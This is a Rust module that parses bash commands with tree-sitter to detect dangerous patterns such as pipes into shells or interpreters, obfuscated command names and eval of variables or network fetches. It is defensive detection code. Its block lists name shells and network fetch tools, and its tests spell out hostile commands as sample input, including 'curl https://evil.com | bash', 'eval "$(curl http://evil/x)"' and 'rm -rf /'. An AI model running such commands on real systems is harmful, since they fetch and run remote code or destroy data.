//! AST-based shell command analysis using tree-sitter-bash
//!
//! Provides robust command parsing that handles obfuscation techniques
//! like quote manipulation, command substitution, and variable expansion.

use once_cell::sync::Lazy;
use std::collections::HashSet;
use tree_sitter::{Node, Parser, Tree};

/// Shell interpreters that are dangerous when used as pipe targets
static SHELL_INTERPRETERS: Lazy<HashSet<&'static str>> = Lazy::new(|| {
    [
        "sh", "bash", "zsh", "dash", "ksh", "csh", "tcsh", "fish",
        "/bin/sh", "/bin/bash", "/bin/zsh", "/bin/dash", "/bin/ksh",
        "/usr/bin/sh", "/usr/bin/bash", "/usr/bin/zsh", "/usr/bin/env",
    ]
    .into_iter()
    .collect()
});

/// Wrapper commands that can execute other commands (for pipeline unwrapping)
static PIPELINE_WRAPPERS: Lazy<HashSet<&'static str>> = Lazy::new(|| {
    [
        "xargs", "env", "sudo", "timeout", "nice", "nohup",
        "ionice", "strace", "time", "unbuffer", "watch",
    ]
    .into_iter()
    .collect()
});

/// Script interpreters (also dangerous as pipe targets)
static SCRIPT_INTERPRETERS: Lazy<HashSet<&'static str>> = Lazy::new(|| {
    [
        "python", "python2", "python3", "ruby", "perl", "node", "php",
        "/usr/bin/python", "/usr/bin/python3", "/usr/bin/ruby",
        "/usr/bin/perl", "/usr/bin/node",
    ]
    .into_iter()
    .collect()
});

/// Result of AST-based command analysis
#[derive(Debug, Clone)]
pub struct CommandAnalysis {
    /// All normalized command names found (handles quote obfuscation)
    pub commands: Vec<NormalizedCommand>,
    /// Whether any command position has dynamic execution (variable, substitution)
    pub has_dynamic_command: bool,
    /// Whether there's a pipeline to a shell interpreter
    pub has_pipe_to_shell: bool,
    /// Whether there's a pipeline to a script interpreter
    pub has_pipe_to_interpreter: bool,
    /// Raw AST parse succeeded
    pub parsed: bool,
    /// Error message if parsing failed
    pub error: Option<String>,
}

/// A normalized command with its arguments
#[derive(Debug, Clone)]
pub struct NormalizedCommand {
    /// The normalized command name (quotes removed, concatenations resolved)
    pub name: String,
    /// The full command line for this command
    pub full_command: String,
    /// Whether the command name was dynamically generated
    pub is_dynamic: bool,
    /// Arguments to the command
    pub arguments: Vec<String>,
}

/// Parse and analyze a bash command using tree-sitter
pub fn analyze_command(source: &str) -> CommandAnalysis {
    let mut parser = Parser::new();

    // Set the bash language
    if parser.set_language(&tree_sitter_bash::LANGUAGE.into()).is_err() {
        return CommandAnalysis {
            commands: vec![],
            has_dynamic_command: false,
            has_pipe_to_shell: false,
            has_pipe_to_interpreter: false,
            parsed: false,
            error: Some("Failed to load tree-sitter-bash language".to_string()),
        };
    }

    let tree = match parser.parse(source, None) {
        Some(t) => t,
        None => {
            return CommandAnalysis {
                commands: vec![],
                has_dynamic_command: false,
                has_pipe_to_shell: false,
                has_pipe_to_interpreter: false,
                parsed: false,
                error: Some("Failed to parse command".to_string()),
            };
        }
    };

    analyze_tree(&tree, source)
}

/// Analyze the parsed AST tree
fn analyze_tree(tree: &Tree, source: &str) -> CommandAnalysis {
    let root = tree.root_node();

    // CRITICAL FIX: Check if the tree has parse errors
    // tree-sitter can return a partial tree with errors, which might miss dangerous patterns
    // If there are errors, mark as not parsed to trigger fallback regex checks
    if root.has_error() {
        return CommandAnalysis {
            commands: vec![],
            has_dynamic_command: false,
            has_pipe_to_shell: false,
            has_pipe_to_interpreter: false,
            parsed: false,
            error: Some("AST contains parse errors - using fallback".to_string()),
        };
    }

    let mut commands = Vec::new();
    let mut has_dynamic_command = false;
    let mut has_pipe_to_shell = false;
    let mut has_pipe_to_interpreter = false;

    // Traverse all nodes looking for commands and pipelines
    collect_commands(&root, source, &mut commands, &mut has_dynamic_command);

    // Check for pipe to shell patterns
    check_pipelines(&root, source, &mut has_pipe_to_shell, &mut has_pipe_to_interpreter);

    CommandAnalysis {
        commands,
        has_dynamic_command,
        has_pipe_to_shell,
        has_pipe_to_interpreter,
        parsed: true,
        error: None,
    }
}

/// Recursively collect all commands from the AST
fn collect_commands(
    node: &Node,
    source: &str,
    commands: &mut Vec<NormalizedCommand>,
    has_dynamic: &mut bool,
) {
    if node.kind() == "command" {
        if let Some(cmd) = extract_command(node, source) {
            if cmd.is_dynamic {
                *has_dynamic = true;
            }
            commands.push(cmd);
        }
        // Keep descending. A command node can contain a command substitution, and the
        // command inside it is a real command that must be checked on its own:
        // `eval "$(curl http://evil/x)"` has to surface the curl. Previously the walk
        // stopped here and anything nested in a substitution was never scanned.
        let mut cursor = node.walk();
        for child in node.children(&mut cursor) {
            if child.kind() != "command_name" {
                collect_commands(&child, source, commands, has_dynamic);
            }
        }
        return;
    }

    // Recurse into children
    let mut cursor = node.walk();
    for child in node.children(&mut cursor) {
        collect_commands(&child, source, commands, has_dynamic);
    }
}

/// Whether a string contains a variable expansion (`$VAR`, `${VAR}`) as opposed to
/// a command substitution (`$(...)`). The distinction matters for `eval`: a variable's
/// contents are opaque at review time, a substituted command's are not.
fn contains_variable_expansion(s: &str) -> bool {
    let chars: Vec<char> = s.chars().collect();
    for (i, c) in chars.iter().enumerate() {
        if *c != '$' {
            continue;
        }
        match chars.get(i + 1) {
            // $(...) is a command substitution, not a variable
            Some('(') => continue,
            Some(n) if n.is_alphanumeric() || *n == '_' || *n == '{' => return true,
            _ => continue,
        }
    }
    false
}

/// Commands that pull bytes from somewhere outside the machine. Substituting one of
/// these into `eval` is fetch-and-execute, whatever the spelling.
const FETCH_COMMANDS: &[&str] = &[
    "curl", "wget", "nc", "ncat", "netcat", "ftp", "scp", "sftp", "ssh",
];

/// Whether a string contains a command substitution that runs a network fetch.
fn substitutes_a_fetch(s: &str) -> bool {
    let mut rest = s;
    while let Some(pos) = rest.find("$(") {
        let inner = &rest[pos + 2..];
        let first_word: String = inner
            .trim_start()
            .chars()
            .take_while(|c| !c.is_whitespace() && *c != ')')
            .collect();
        let base = first_word.rsplit('/').next().unwrap_or("").to_lowercase();
        if FETCH_COMMANDS.contains(&base.as_str()) {
            return true;
        }
        rest = inner;
    }
    false
}

/// Extract a normalized command from a command node
fn extract_command(node: &Node, source: &str) -> Option<NormalizedCommand> {
    let full_text = node.utf8_text(source.as_bytes()).ok()?;

    // Find the command_name child
    let mut cursor = node.walk();
    let mut command_name_node = None;
    let mut arguments = Vec::new();
    let mut in_args = false;

    for child in node.children(&mut cursor) {
        match child.kind() {
            "command_name" => {
                command_name_node = Some(child);
                in_args = true;
            }
            "word" | "string" | "raw_string" | "concatenation"
            | "simple_expansion" | "expansion" | "command_substitution" if in_args => {
                if let Ok(text) = child.utf8_text(source.as_bytes()) {
                    arguments.push(normalize_word(&child, source));
                    let _ = text; // Silence warning
                }
            }
            _ => {}
        }
    }

    let command_name_node = command_name_node?;
    let (name, mut is_dynamic) = normalize_command_name(&command_name_node, source);

    // `eval` is the one command whose quoted argument is unambiguously code:
    // `eval "$PAYLOAD"` runs whatever the variable holds. Detect it structurally, on
    // the command name, rather than by regex over the command text. A regex needs the
    // `$` to survive, which it does not once string literals are blanked for scanning,
    // and matching the text would also fire on prose that merely mentions eval.
    //
    // Only a VARIABLE expansion counts. `eval "$(some-command)"` is the standard
    // shell idiom for environment setup — ssh-agent, direnv, rbenv, and this fleet's
    // own `eval "$(fleetops session-stamp)"` all use it — and unlike a variable, the
    // inner command is right there in the text. It gets collected and rule-checked on
    // its own (see collect_commands, which descends into substitutions), so refusing
    // the whole form categorically would buy nothing and break a daily workflow.
    if name == "eval" || name.ends_with("/eval") {
        if arguments.iter().any(|a| contains_variable_expansion(a)) {
            is_dynamic = true;
        }
        // The one substitution that is never an env-setup idiom: fetching bytes off
        // the network and running them. `eval "$(curl ...)"` is curl-pipe-sh wearing
        // a different hat, and no ordinary rule catches it, because a bare `curl` is
        // not itself dangerous — only eval-ing its output is.
        if arguments.iter().any(|a| substitutes_a_fetch(a)) {
            is_dynamic = true;
        }
    }

    Some(NormalizedCommand {
        name,
        full_command: full_text.to_string(),
        is_dynamic,
        arguments,
    })
}

/// Normalize a command name, handling quote obfuscation and detecting dynamic names
/// Returns (normalized_name, is_dynamic)
fn normalize_command_name(node: &Node, source: &str) -> (String, bool) {
    let mut cursor = node.walk();

    // Check the first child to determine what kind of command name this is
    if let Some(child) = node.children(&mut cursor).next() {
        match child.kind() {
            // Variable expansion in command position = dynamic
            "simple_expansion" | "expansion" => {
                let text = child.utf8_text(source.as_bytes()).unwrap_or("$?");
                return (text.to_string(), true);
            }
            // Command substitution in command position = dynamic
            "command_substitution" => {
                let text = child.utf8_text(source.as_bytes()).unwrap_or("$(...)");
                return (text.to_string(), true);
            }
            // Concatenation (like ba'sh') - normalize it
            "concatenation" => {
                let normalized = normalize_concatenation(&child, source);
                // Check if any part of the concatenation is dynamic
                let is_dynamic = has_dynamic_parts(&child, source);
                return (normalized, is_dynamic);
            }
            // Simple word
            "word" => {
                let text = child.utf8_text(source.as_bytes()).unwrap_or("");
                return (text.to_string(), false);
            }
            // Quoted string - remove quotes
            "string" | "raw_string" => {
                let text = child.utf8_text(source.as_bytes()).unwrap_or("");
                return (strip_quotes(text), false);
            }
            _ => {}
        }
    }

    // Fallback: use raw text
    let text = node.utf8_text(source.as_bytes()).unwrap_or("");
    (text.to_string(), false)
}

/// Normalize a concatenation node (like ba'sh' -> bash)
fn normalize_concatenation(node: &Node, source: &str) -> String {
    let mut result = String::new();
    let mut cursor = node.walk();

    for child in node.children(&mut cursor) {
        match child.kind() {
            "word" => {
                if let Ok(text) = child.utf8_text(source.as_bytes()) {
                    result.push_str(text);
                }
            }
            "string" | "raw_string" => {
                if let Ok(text) = child.utf8_text(source.as_bytes()) {
                    result.push_str(&strip_quotes(text));
                }
            }
            "simple_expansion" | "expansion" | "command_substitution" => {
                // Include as-is for pattern matching but mark as potentially dynamic
                if let Ok(text) = child.utf8_text(source.as_bytes()) {
                    result.push_str(text);
                }
            }
            // Recurse for nested concatenations
            "concatenation" => {
                result.push_str(&normalize_concatenation(&child, source));
            }
            _ => {
                if let Ok(text) = child.utf8_text(source.as_bytes()) {
                    result.push_str(text);
                }
            }
        }
    }

    result
}

/// Check if a node contains dynamic parts (variables, command substitution)
fn has_dynamic_parts(node: &Node, source: &str) -> bool {
    match node.kind() {
        "simple_expansion" | "expansion" | "command_substitution" => true,
        _ => {
            let mut cursor = node.walk();
            for child in node.children(&mut cursor) {
                if has_dynamic_parts(&child, source) {
                    return true;
                }
            }
            false
        }
    }
}

/// Normalize a word (handles quoted strings, concatenations)
fn normalize_word(node: &Node, source: &str) -> String {
    match node.kind() {
        "concatenation" => normalize_concatenation(node, source),
        "string" | "raw_string" => {
            let text = node.utf8_text(source.as_bytes()).unwrap_or("");
            strip_quotes(text)
        }
        _ => node.utf8_text(source.as_bytes()).unwrap_or("").to_string(),
    }
}

/// Strip quotes from a string
fn strip_quotes(s: &str) -> String {
    let s = s.trim();
    if (s.starts_with('"') && s.ends_with('"')) || (s.starts_with('\'') && s.ends_with('\'')) {
        s[1..s.len() - 1].to_string()
    } else {
        s.to_string()
    }
}

/// Check for pipeline to shell patterns
fn check_pipelines(
    node: &Node,
    source: &str,
    has_pipe_to_shell: &mut bool,
    has_pipe_to_interpreter: &mut bool,
) {
    if node.kind() == "pipeline" {
        // Get the last command in the pipeline
        let mut cursor = node.walk();
        let children: Vec<_> = node.children(&mut cursor).collect();

        // Find the last command
        if let Some(last_cmd) = children.iter().rev().find(|c| c.kind() == "command") {
            if let Some(cmd) = extract_command(last_cmd, source) {
                // Check the command and its arguments for interpreters
                // This handles cases like: | xargs bash -c, | env sh, etc.
                check_command_for_interpreters(
                    &cmd,
                    has_pipe_to_shell,
                    has_pipe_to_interpreter,
                );
            }
        }
    }

    // Recurse into children
    let mut cursor = node.walk();
    for child in node.children(&mut cursor) {
        check_pipelines(&child, source, has_pipe_to_shell, has_pipe_to_interpreter);
    }
}

/// Whether a script interpreter was given its program explicitly, rather than
/// reading it from stdin.
///
/// This is the difference between code and data. `cmd | python3` makes the piped
/// bytes the *program*: whatever flows in gets executed. `cmd | python3 -c '...'`,
/// `cmd | python3 script.py` and `cmd | python3 -m json.tool` all fix the program
/// up front, so the piped bytes are only ever *input* to it. The second form is
/// how a shell feeds structured data to a parser, and blocking it buys nothing.
///
/// An explicit `-` argument means "read the program from stdin" and is therefore
/// NOT an explicit program, even though it is a non-flag argument.
///
/// Deliberately not applied to shell interpreters. `sh`/`bash` are the highest-value
/// target and the legitimate need for `... | bash -c` is close to nil, so they stay
/// blocked unconditionally.
fn has_explicit_program(cmd: &NormalizedCommand) -> bool {
    for arg in &cmd.arguments {
        let a = arg.to_lowercase();

        // Explicit stdin-as-program: python3 -
        if a == "-" {
            return false;
        }

        if let Some(flag) = a.strip_prefix('-') {
            // Long forms: --eval, --command
            if flag.starts_with("-") {
                let long = flag.trim_start_matches('-');
                if long.starts_with("eval") || long.starts_with("command") {
                    return true;
                }
                continue;
            }
            // Short clusters. -c (python/node/ruby), -e (node/ruby/perl),
            // -m (python module), and perl's -pe / -ne / -ape combinations.
            if flag.contains('c') || flag.contains('e') || flag.contains('m') {
                return true;
            }
            continue;
        }

        // First non-flag argument is the script path. Anything nameable as a file
        // fixes the program: parse.py, ./run, /usr/local/bin/tool.
        return true;
    }
    false
}

/// Check a command (and its arguments) for shell/script interpreters
/// This handles wrappers like xargs, env, etc.
fn check_command_for_interpreters(
    cmd: &NormalizedCommand,
    has_pipe_to_shell: &mut bool,
    has_pipe_to_interpreter: &mut bool,
) {
    let normalized_name = cmd.name.to_lowercase();

    // Direct interpreter check
    if SHELL_INTERPRETERS.contains(normalized_name.as_str()) {
        *has_pipe_to_shell = true;
        return;
    }
    if SCRIPT_INTERPRETERS.contains(normalized_name.as_str()) {
        // Only a bare interpreter takes its program from the pipe.
        if !has_explicit_program(cmd) {
            *has_pipe_to_interpreter = true;
        }
        return;
    }

    // Check if this is a wrapper command
    // If so, check the arguments for interpreters
    if PIPELINE_WRAPPERS.contains(normalized_name.as_str()) && !cmd.arguments.is_empty() {
        // For wrapper commands, check all arguments for interpreter names
        // This catches: xargs bash, xargs sh -c, env bash, sudo bash, etc.
        for arg in &cmd.arguments {
            let arg_lower = arg.to_lowercase();
            // Skip flags
            if arg_lower.starts_with('-') {
                continue;
            }
            // Check if this argument is an interpreter
            if SHELL_INTERPRETERS.contains(arg_lower.as_str()) {
                *has_pipe_to_shell = true;
                return;
            }
            if SCRIPT_INTERPRETERS.contains(arg_lower.as_str()) {
                *has_pipe_to_interpreter = true;
                return;
            }
            // Also check for path-based interpreter names
            if arg_lower.ends_with("/sh") || arg_lower.ends_with("/bash")
                || arg_lower.ends_with("/zsh") || arg_lower.ends_with("/dash")
            {
                *has_pipe_to_shell = true;
                return;
            }
            if arg_lower.ends_with("/python") || arg_lower.ends_with("/python3")
                || arg_lower.ends_with("/ruby") || arg_lower.ends_with("/perl")
                || arg_lower.ends_with("/node")
            {
                *has_pipe_to_interpreter = true;
                return;
            }
        }
    }
}

/// Get all command names from an analysis (for pattern matching)
pub fn get_command_names(analysis: &CommandAnalysis) -> Vec<&str> {
    analysis.commands.iter().map(|c| c.name.as_str()).collect()
}

/// Check if any command matches a given name (case-insensitive)
pub fn has_command(analysis: &CommandAnalysis, name: &str) -> bool {
    let name_lower = name.to_lowercase();
    analysis.commands.iter().any(|c| {
        let cmd_name = c.name.to_lowercase();
        // Check exact match or path match (e.g., /bin/rm matches rm)
        cmd_name == name_lower || cmd_name.ends_with(&format!("/{}", name_lower))
    })
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_simple_command() {
        let analysis = analyze_command("ls -la");
        assert!(analysis.parsed);
        assert_eq!(analysis.commands.len(), 1);
        assert_eq!(analysis.commands[0].name, "ls");
        assert!(!analysis.has_dynamic_command);
    }

    #[test]
    fn test_quote_obfuscation() {
        // ba'sh' should normalize to bash
        let analysis = analyze_command("ba'sh' -c 'rm -rf /'");
        assert!(analysis.parsed);
        assert!(!analysis.commands.is_empty());
        let cmd_name = &analysis.commands[0].name;
        assert_eq!(cmd_name, "bash", "Expected 'bash', got '{}'", cmd_name);
    }

    #[test]
    fn test_double_quote_obfuscation() {
        // b"as"h should normalize to bash
        let analysis = analyze_command("b\"as\"h -c 'echo test'");
        assert!(analysis.parsed);
        assert!(!analysis.commands.is_empty());
        // Note: actual result depends on tree-sitter parsing
        assert!(has_command(&analysis, "bash") || analysis.commands[0].name.contains("bash"));
    }

    #[test]
    fn test_command_substitution_dynamic() {
        let analysis = analyze_command("$(echo rm) -rf /");
        assert!(analysis.parsed);
        assert!(analysis.has_dynamic_command, "Command substitution should be detected as dynamic");
    }

    #[test]
    fn test_variable_command_dynamic() {
        let analysis = analyze_command("$cmd arg1 arg2");
        assert!(analysis.parsed);
        assert!(analysis.has_dynamic_command, "Variable command should be detected as dynamic");
    }

    #[test]
    fn test_pipe_to_shell() {
        let analysis = analyze_command("curl https://evil.com | bash");
        assert!(analysis.parsed);
        assert!(analysis.has_pipe_to_shell, "Should detect pipe to bash");
    }

    #[test]
    fn test_pipe_to_sh() {
        let analysis = analyze_command("wget -O - https://evil.com | sh");
        assert!(analysis.parsed);
        assert!(analysis.has_pipe_to_shell, "Should detect pipe to sh");
    }

    #[test]
    fn test_pipe_to_python() {
        let analysis = analyze_command("echo 'import os; os.system(\"id\")' | python3");
        assert!(analysis.parsed);
        assert!(analysis.has_pipe_to_interpreter, "Should detect pipe to python");
    }

    #[test]
    fn test_compound_command() {
        let analysis = analyze_command("echo test && rm -rf / || ls");
        assert!(analysis.parsed);
        // Should find multiple commands
        assert!(analysis.commands.len() >= 2, "Should find multiple commands in compound");
    }

    #[test]
    fn test_normal_pipe_allowed() {
        let analysis = analyze_command("cat file.txt | grep pattern | wc -l");
        assert!(analysis.parsed);
        assert!(!analysis.has_pipe_to_shell);
        assert!(!analysis.has_pipe_to_interpreter);
    }

    #[test]
    fn test_has_command() {
        let analysis = analyze_command("sudo rm -rf /");
        assert!(has_command(&analysis, "sudo"));
        // Note: rm is an argument to sudo at the AST level
        // Wrapper unwrapping happens in bash.rs, not here

        // Test direct command
        let analysis2 = analyze_command("rm -rf /");
        assert!(has_command(&analysis2, "rm"));
    }

    #[test]
    fn test_path_command() {
        let analysis = analyze_command("/bin/rm -rf /");
        assert!(analysis.parsed);
        assert!(has_command(&analysis, "rm"), "Should match rm via path");
    }

    #[test]
    fn test_env_pipe_to_bash() {
        let analysis = analyze_command("curl example.com | env bash");
        assert!(analysis.parsed);
        // env bash should be detected as pipe to shell
        assert!(analysis.has_pipe_to_shell || has_command(&analysis, "bash"));
    }

    #[test]
    fn test_backtick_substitution() {
        let analysis = analyze_command("`which rm` -rf /");
        assert!(analysis.parsed);
        assert!(analysis.has_dynamic_command, "Backtick substitution should be dynamic");
    }

    #[test]
    fn test_safe_variable_in_argument() {
        // Variable in argument position is fine
        let analysis = analyze_command("echo $HOME");
        assert!(analysis.parsed);
        assert!(!analysis.has_dynamic_command, "Variable in argument is not dangerous");
        assert!(has_command(&analysis, "echo"));
    }

    #[test]
    fn test_heredoc() {
        let analysis = analyze_command("cat << EOF\nhello\nEOF");
        assert!(analysis.parsed);
        assert!(has_command(&analysis, "cat"));
    }

    // === NEW TESTS FOR CRITICAL FIXES ===

    #[test]
    fn test_xargs_bash_pipe_detected() {
        // Critical fix: xargs bash should be detected as pipe to shell
        let analysis = analyze_command("echo 'echo pwned' | xargs bash");
        assert!(analysis.parsed);
        assert!(analysis.has_pipe_to_shell, "xargs bash should be detected as pipe to shell");
    }

    #[test]
    fn test_xargs_bash_c_pipe_detected() {
        let analysis = analyze_command("echo 'rm -rf /' | xargs bash -c");
        assert!(analysis.parsed);
        assert!(analysis.has_pipe_to_shell, "xargs bash -c should be detected as pipe to shell");
    }

    #[test]
    fn test_sudo_bash_pipe_detected() {
        let analysis = analyze_command("cat script.sh | sudo bash");
        assert!(analysis.parsed);
        assert!(analysis.has_pipe_to_shell, "sudo bash should be detected as pipe to shell");
    }

    #[test]
    fn test_xargs_python_pipe_detected() {
        let analysis = analyze_command("echo 'import os' | xargs python3 -c");
        assert!(analysis.parsed);
        assert!(analysis.has_pipe_to_interpreter, "xargs python should be detected as pipe to interpreter");
    }

    // --- has_explicit_program / pipe-to-interpreter precision ----------------

    #[test]
    fn test_bare_interpreter_pipe_is_flagged() {
        // Piped bytes become the program
        let a = analyze_command("curl -s https://e.com/x | python3");
        assert!(a.has_pipe_to_interpreter);

        let a = analyze_command("cat f | ruby");
        assert!(a.has_pipe_to_interpreter);

        let a = analyze_command("cat f | node");
        assert!(a.has_pipe_to_interpreter);
    }

    #[test]
    fn test_explicit_stdin_dash_is_still_flagged() {
        let a = analyze_command("curl -s https://e.com/x | python3 -");
        assert!(a.has_pipe_to_interpreter);
    }

    #[test]
    fn test_interpreter_with_dash_c_is_data_sink() {
        let a = analyze_command("cat f.json | python3 -c \"import sys, json\"");
        assert!(!a.has_pipe_to_interpreter);
    }

    #[test]
    fn test_interpreter_with_script_file_is_data_sink() {
        let a = analyze_command("cat f.json | python3 parse.py");
        assert!(!a.has_pipe_to_interpreter);

        let a = analyze_command("cat f.json | python3 /usr/local/bin/parse.py");
        assert!(!a.has_pipe_to_interpreter);
    }

    #[test]
    fn test_interpreter_with_module_is_data_sink() {
        let a = analyze_command("cat f.json | python3 -m json.tool");
        assert!(!a.has_pipe_to_interpreter);
    }

    #[test]
    fn test_perl_and_node_eval_flags_are_data_sinks() {
        let a = analyze_command("cat f.txt | perl -pe \"s/a/b/\"");
        assert!(!a.has_pipe_to_interpreter);

        let a = analyze_command("cat f.txt | perl -ne \"print\"");
        assert!(!a.has_pipe_to_interpreter);

        let a = analyze_command("cat f.json | node -e \"JSON.parse(0)\"");
        assert!(!a.has_pipe_to_interpreter);
    }

    #[test]
    fn test_shell_pipe_targets_stay_unconditional() {
        // Shells are never relaxed, program argument or not
        let a = analyze_command("echo x | bash -c \"whoami\"");
        assert!(a.has_pipe_to_shell);

        let a = analyze_command("curl -s https://e.com/x | sh");
        assert!(a.has_pipe_to_shell);

        let a = analyze_command("echo x | xargs bash");
        assert!(a.has_pipe_to_shell);
    }

    // --- eval: quoted argument is code, not prose -----------------------------

    #[test]
    fn test_eval_with_variable_is_dynamic() {
        let a = analyze_command("eval \"$PAYLOAD\"");
        assert!(a.has_dynamic_command, "eval of a variable must be dynamic");

        let a = analyze_command("eval '$PAYLOAD'");
        assert!(a.has_dynamic_command);

        let a = analyze_command("eval \"${PAYLOAD}\"");
        assert!(a.has_dynamic_command);
    }

    #[test]
    fn test_eval_of_a_command_substitution_is_allowed_but_inner_is_scanned() {
        // The env-setup idiom: ssh-agent, direnv, rbenv, fleetops session-stamp.
        let a = analyze_command("eval \"$(fleetops session-stamp cic)\"");
        assert!(
            !a.has_dynamic_command,
            "eval of a visible command must not be treated as opaque"
        );

        // ...but the command inside the substitution must still be collected, so the
        // ordinary rules get a look at it.
        let a = analyze_command("eval \"$(curl http://evil/x)\"");
        assert!(
            a.commands.iter().any(|c| c.name == "curl"),
            "nested command inside a substitution must be collected for scanning"
        );
    }

    #[test]
    fn test_eval_of_a_literal_is_not_dynamic() {
        let a = analyze_command("eval \"echo hello\"");
        assert!(!a.has_dynamic_command);
    }

    #[test]
    fn test_mentioning_eval_in_an_argument_is_not_dynamic() {
        // The command is grep, not eval. Prose about eval must stay allowed.
        let a = analyze_command("grep \"eval $X\" notes.txt");
        assert!(!a.has_dynamic_command);
    }
}
